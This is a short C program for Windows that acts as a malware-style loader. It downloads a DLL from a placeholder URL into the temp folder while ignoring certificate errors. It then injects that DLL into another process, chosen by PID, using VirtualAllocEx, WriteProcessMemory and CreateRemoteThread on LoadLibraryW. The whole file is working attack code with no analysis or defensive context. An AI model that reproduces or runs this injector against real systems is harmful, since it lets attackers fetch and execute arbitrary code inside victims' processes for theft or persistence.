#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

int main(int argc, char* argv[]) {
	wchar_t dllPath[MAX_PATH];
	GetTempPathW(MAX_PATH, dllPath);
	wcscat(dllPath, L"maindll.dll");
	printf("DLL path: %S\n", dllPath);

	HINTERNET hInternet = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hUrl = InternetOpenUrlA(hInternet, "https:<YOUR URL>/maindll.dll", NULL, 0,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);

	HANDLE hFile = CreateFileW(dllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	char buf[4096]; DWORD bytesRead, bytesWritten, total = 0;
	while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
		WriteFile(hFile, buf, bytesRead, &bytesWritten, NULL);
		total += bytesWritten;
	}
	printf("Downloaded %d bytes to %S\n", total, dllPath);

	CloseHandle(hFile);
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
	PVOID pAddress = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pAddress, dllPath, sizeof(dllPath), NULL);
	PTHREAD_START_ROUTINE loadLib = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(hProcess, NULL, 0, loadLib, pAddress, 0, NULL);
	CloseHandle(hProcess);
	printf("Inject done\n");
	return 0;
}
